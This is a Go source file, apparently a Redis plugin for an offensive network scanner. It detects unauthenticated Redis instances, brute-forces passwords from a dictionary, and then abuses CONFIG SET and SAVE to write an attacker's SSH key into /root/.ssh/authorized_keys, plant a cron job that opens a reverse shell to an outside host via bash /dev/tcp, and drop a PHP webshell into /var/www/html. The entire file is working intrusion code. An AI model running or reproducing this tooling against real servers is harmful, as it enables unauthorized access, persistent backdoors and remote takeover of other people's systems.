package Plugins

import (
	"bufio"
	"fmt"
	"github.com/nerowander/MultiCheck/common"
	"github.com/nerowander/MultiCheck/config"
	"io"
	"net"
	"os"
	"strings"
	"time"
)

var (
	dbfilename string
	dir        string
)

func scanRedis(info *config.InfoScan) (reserr error) {
	startTime := time.Now().Unix()
	flag, err := RedisUnauth(info)
	if flag == true && err == nil {
		return err
	}
	if info.Brute == false {
		return
	}
	for _, pass := range config.PasswordDict {
		pass = strings.Replace(pass, "{user}", "redis", -1)
		var res bool
		res, err = RedisConn(info, pass)
		if res == true && err == nil {
			return err
		} else {
			errlog := fmt.Sprintf("[-] redis %v:%v %v %v", info.Hosts, info.Ports, pass, err)
			common.LogError(errlog)
			reserr = err
			if common.CheckErrMessages(err) {
				return err
			}
			if time.Now().Unix()-startTime > (int64(len(config.PasswordDict)) * config.Timeout) {
				return err
			}
		}
	}
	return reserr
}

func RedisConn(info *config.InfoScan, pass string) (bool, error) {
	flag := false
	realhost := fmt.Sprintf("%s:%v", info.Hosts, info.Ports)
	conn, err := common.TestTCPWithTimeout("tcp", realhost, time.Duration(config.Timeout)*time.Second)
	if err != nil {
		return false, err
	}
	defer conn.Close()
	err = conn.SetReadDeadline(time.Now().Add(time.Duration(config.Timeout) * time.Second))
	if err != nil {
		return false, err
	}
	_, err = conn.Write([]byte(fmt.Sprintf("auth %s\r\n", pass)))
	if err != nil {
		return false, err
	}
	var reply string
	reply, err = readreply(conn)
	if err != nil {
		return false, err
	}
	if strings.Contains(reply, "+OK") {
		flag = true
		dbfilename, dir, err = getConfig(conn)
		if err != nil {
			result := fmt.Sprintf("[+] Redis %s %s", realhost, pass)
			common.LogSuccess(result)
			return flag, err
		} else {
			result := fmt.Sprintf("[+] Redis %s %s file:%s/%s", realhost, pass, dir, dbfilename)
			common.LogSuccess(result)
		}
		err = Exploit(info, realhost, conn)
	}
	return flag, err
}

func RedisUnauth(info *config.InfoScan) (flag bool, err error) {
	flag = false
	realhost := fmt.Sprintf("%s:%v", info.Hosts, info.Ports)
	var conn net.Conn
	conn, err = common.TestTCPWithTimeout("tcp", realhost, time.Duration(config.Timeout)*time.Second)
	if err != nil {
		return flag, err
	}
	defer conn.Close()
	err = conn.SetReadDeadline(time.Now().Add(time.Duration(config.Timeout) * time.Second))
	if err != nil {
		return flag, err
	}
	_, err = conn.Write([]byte("info\r\n"))
	if err != nil {
		return flag, err
	}
	var reply string
	reply, err = readreply(conn)
	if err != nil {
		return flag, err
	}
	if strings.Contains(reply, "redis_version") {
		flag = true
		dbfilename, dir, err = getConfig(conn)
		if err != nil {
			result := fmt.Sprintf("[+] Redis %s unauthorized", realhost)
			common.LogSuccess(result)
			return flag, err
		} else {
			result := fmt.Sprintf("[+] Redis %s unauthorized file:%s/%s", realhost, dir, dbfilename)
			common.LogSuccess(result)
		}
		err = Exploit(info, realhost, conn)
	}
	return flag, err
}

func Exploit(info *config.InfoScan, realhost string, conn net.Conn) (err error) {
	if info.SkipRedis == true {
		return nil
	}
	flagSsh, err1 := testSshWrite(conn)
	flagCron, err2 := testCronWrite(conn)
	flagWebshell, err3 := testWebshellWrite(conn)
	//if err != nil {
	//	return err
	//}
	var writeok bool
	var text string
	if flagSsh == true && err1 == nil {
		result := fmt.Sprintf("[+] Redis %v can write /root/.ssh/", realhost)
		common.LogSuccess(result)
		if info.RedisSshFile != "" {
			writeok, text, err = writeKey(conn, info.RedisSshFile)
			if err != nil {
				result = fmt.Sprintf("[-] %v SSH write key error: %v", realhost, text)
				common.LogError(result)
				//return err
			}
			if writeok {
				result = fmt.Sprintf("[+] Redis %v SSH public key was written successfully", realhost)
				common.LogSuccess(result)
			} else {
				fmt.Println("[-] Redis ", realhost, "SSHPUB write failed", text)
			}
		}
	}

	if flagCron == true && err2 == nil {
		result := fmt.Sprintf("[+] Redis %v can write /var/spool/cron/", realhost)
		common.LogSuccess(result)
		if info.RedisCronHost != "" {
			writeok, text, err = writeCron(conn, info.RedisCronHost)
			if err != nil {
				result = fmt.Sprintf("[-] %v SSH write crontab error: %v", realhost, text)
				common.LogError(result)
				//return err
			}
			if writeok {
				result = fmt.Sprintf("[+] Redis %v /var/spool/cron/root was written successfully", realhost)
				common.LogSuccess(result)
			} else {
				fmt.Println("[-] Redis ", realhost, "cron write failed", text)
			}
		}
	}

	// redis write webshell
	if flagWebshell == true && err3 == nil {
		result := fmt.Sprintf("[+] Redis %v can write /var/www/html/", realhost)
		common.LogSuccess(result)
		if info.RedisWebshellFile != "" {
			writeok, text, err = writeWebshell(conn, info.RedisWebshellFile)
			if err != nil {
				result = fmt.Sprintf("[-] %v SSH write webshell error: %v", realhost, text)
				common.LogError(result)
				//return err
			}
			if writeok {
				result = fmt.Sprintf("[+] Redis %v /var/www/html/shell.php was written successfully", realhost)
				common.LogSuccess(result)
			} else {
				fmt.Println("[-] Redis ", realhost, "webshell write failed", text)
			}
		}
	}

	err4 := recoverDB(dbfilename, dir, conn)
	if err4 != nil {
		err = err4
		return err
	} else {
		return err
	}
}

func writeKey(conn net.Conn, filename string) (flag bool, text string, err error) {
	flag = false
	_, err = conn.Write([]byte("CONFIG SET dir /root/.ssh/\r\n"))
	if err != nil {
		return flag, text, err
	}
	text, err = readreply(conn)
	if err != nil {
		return flag, text, err
	}
	if strings.Contains(text, "OK") {
		_, err = conn.Write([]byte("CONFIG SET dbfilename authorized_keys\r\n"))
		if err != nil {
			return flag, text, err
		}
		text, err = readreply(conn)
		if err != nil {
			return flag, text, err
		}
		if strings.Contains(text, "OK") {
			var key string
			key, err = Readfile(filename)
			if err != nil {
				text = fmt.Sprintf("Open %s error, %v", filename, err)
				return flag, text, err
			}
			if len(key) == 0 {
				text = fmt.Sprintf("the keyfile %s is empty", filename)
				return flag, text, err
			}
			_, err = conn.Write([]byte(fmt.Sprintf("set x \"\\n\\n\\n%v\\n\\n\\n\"\r\n", key)))
			if err != nil {
				return flag, text, err
			}
			text, err = readreply(conn)
			if err != nil {
				return flag, text, err
			}
			if strings.Contains(text, "OK") {
				_, err = conn.Write([]byte("save\r\n"))
				if err != nil {
					return flag, text, err
				}
				text, err = readreply(conn)
				if err != nil {
					return flag, text, err
				}
				if strings.Contains(text, "OK") {
					flag = true
				}
			}
		}
	}
	text = strings.TrimSpace(text)
	if len(text) > 50 {
		text = text[:50]
	}
	return flag, text, err
}

func writeCron(conn net.Conn, host string) (flag bool, text string, err error) {
	flag = false
	// try ubuntu
	_, err = conn.Write([]byte("CONFIG SET dir /var/spool/cron/crontabs/\r\n"))
	if err != nil {
		return flag, text, err
	}
	text, err = readreply(conn)
	if err != nil {
		return flag, text, err
	}
	if !strings.Contains(text, "OK") {
		// CentOS
		_, err = conn.Write([]byte("CONFIG SET dir /var/spool/cron/\r\n"))
		if err != nil {
			return flag, text, err
		}
		text, err = readreply(conn)
		if err != nil {
			return flag, text, err
		}
	}
	if strings.Contains(text, "OK") {
		_, err = conn.Write([]byte("CONFIG SET dbfilename root\r\n"))
		if err != nil {
			return flag, text, err
		}
		text, err = readreply(conn)
		if err != nil {
			return flag, text, err
		}
		if strings.Contains(text, "OK") {
			target := strings.Split(host, ":")
			if len(target) < 2 {
				return flag, "host error", err
			}
			scanIp, scanPort := target[0], target[1]
			_, err = conn.Write([]byte(fmt.Sprintf("set x \"\\n\\n* * * * * bash -i >& /dev/tcp/%v/%v 0>&1\\n\\n\"\r\n", scanIp, scanPort)))
			if err != nil {
				return flag, text, err
			}
			text, err = readreply(conn)
			if err != nil {
				return flag, text, err
			}
			if strings.Contains(text, "OK") {
				_, err = conn.Write([]byte("save\r\n"))
				if err != nil {
					return flag, text, err
				}
				text, err = readreply(conn)
				if err != nil {
					return flag, text, err
				}
				if strings.Contains(text, "OK") {
					flag = true
				}
			}
		}
	}
	text = strings.TrimSpace(text)
	if len(text) > 50 {
		text = text[:50]
	}
	return flag, text, err
}

func writeWebshell(conn net.Conn, filename string) (flag bool, text string, err error) {
	flag = false
	_, err = conn.Write([]byte("CONFIG SET dir /var/www/html/\r\n"))
	if err != nil {
		return flag, text, err
	}
	text, err = readreply(conn)
	if err != nil {
		return flag, text, err
	}
	if strings.Contains(text, "OK") {
		_, err = conn.Write([]byte("CONFIG SET dbfilename shell.php\r\n"))
		if err != nil {
			return flag, text, err
		}
		text, err = readreply(conn)
		if err != nil {
			return flag, text, err
		}
		if strings.Contains(text, "OK") {
			var key string
			key, err = Readfile(filename)
			if err != nil {
				text = fmt.Sprintf("Open %s error, %v", filename, err)
				return flag, text, err
			}
			if len(key) == 0 {
				text = fmt.Sprintf("the keyfile %s is empty", filename)
				return flag, text, err
			}
			_, err = conn.Write([]byte(fmt.Sprintf("set shell \"\\n\\n\\n%v\\n\\n\\n\"", key)))
			if err != nil {
				return flag, text, err
			}
			text, err = readreply(conn)
			if err != nil {
				return flag, text, err
			}
			if strings.Contains(text, "OK") {
				_, err = conn.Write([]byte("save\r\n"))
				if err != nil {
					return flag, text, err
				}
				text, err = readreply(conn)
				if err != nil {
					return flag, text, err
				}
				if strings.Contains(text, "OK") {
					flag = true
				}
			}
		}
	}
	text = strings.TrimSpace(text)
	if len(text) > 50 {
		text = text[:50]
	}
	return flag, text, err
}
func Readfile(filename string) (string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return "", err
	}
	defer file.Close()
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		text := strings.TrimSpace(scanner.Text())
		if text != "" {
			return text, nil
		}
	}
	return "", err
}

func readreply(conn net.Conn) (string, error) {
	conn.SetReadDeadline(time.Now().Add(time.Second))
	bytes, err := io.ReadAll(conn)
	if len(bytes) > 0 {
		err = nil
	}
	return string(bytes), err
}

func testSshWrite(conn net.Conn) (flagSsh bool, err error) {
	var text string
	// test ssh
	_, err = conn.Write([]byte("CONFIG SET dir /root/.ssh/\r\n"))
	if err != nil {
		return flagSsh, err
	}
	text, err = readreply(conn)
	if err != nil {
		return flagSsh, err
	}
	if strings.Contains(text, "OK") {
		flagSsh = true
	}
	return flagSsh, err
}

func testCronWrite(conn net.Conn) (flagCron bool, err error) {
	var text string
	// test crontab
	_, err = conn.Write([]byte("CONFIG SET dir /var/spool/cron/\r\n"))
	if err != nil {
		return flagCron, err
	}
	text, err = readreply(conn)
	if err != nil {
		return flagCron, err
	}
	if strings.Contains(text, "OK") {
		flagCron = true
	}
	return flagCron, err
}

func testWebshellWrite(conn net.Conn) (flagWebshell bool, err error) {
	var text string
	// test webshell
	_, err = conn.Write([]byte("CONFIG SET dir /var/www/html/\r\n"))
	if err != nil {
		return flagWebshell, err
	}
	text, err = readreply(conn)
	if err != nil {
		return flagWebshell, err
	}
	if strings.Contains(text, "OK") {
		flagWebshell = true
	}
	return flagWebshell, err
}
func getConfig(conn net.Conn) (dbfilename string, dir string, err error) {
	_, err = conn.Write([]byte("CONFIG GET dbfilename\r\n"))
	if err != nil {
		return
	}
	text, err := readreply(conn)
	if err != nil {
		return
	}
	text1 := strings.Split(text, "\r\n")
	if len(text1) > 2 {
		dbfilename = text1[len(text1)-2]
	} else {
		dbfilename = text1[0]
	}
	_, err = conn.Write([]byte("CONFIG GET dir\r\n"))
	if err != nil {
		return
	}
	text, err = readreply(conn)
	if err != nil {
		return
	}
	text1 = strings.Split(text, "\r\n")
	if len(text1) > 2 {
		dir = text1[len(text1)-2]
	} else {
		dir = text1[0]
	}
	return
}

func recoverDB(dbfilename string, dir string, conn net.Conn) (err error) {
	_, err = conn.Write([]byte(fmt.Sprintf("CONFIG SET dbfilename %s\r\n", dbfilename)))
	if err != nil {
		return err
	}
	_, err = readreply(conn)
	if err != nil {
		return err
	}
	_, err = conn.Write([]byte(fmt.Sprintf("CONFIG SET dir %s\r\n", dir)))
	if err != nil {
		return err
	}
	_, err = readreply(conn)
	if err != nil {
		return err
	}
	return err
}
